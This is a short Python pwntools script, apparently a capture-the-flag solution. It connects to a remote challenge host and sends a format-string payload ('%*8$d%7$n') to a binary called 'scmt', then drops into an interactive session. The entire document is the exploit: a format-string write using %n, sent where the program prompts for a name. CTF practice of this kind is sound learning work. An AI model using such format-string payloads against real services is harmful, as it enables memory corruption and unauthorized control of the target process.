from pwn import *
from LibcSearcher import LibcSearcher

p = remote("node2.hackingfor.fun",36055)
#p = process("./scmt")

# 6$ = arry[0]

#gdb.attach(p)
payload = "%*8$d%7$n"

p.sendafter("name",payload)

p.interactive()

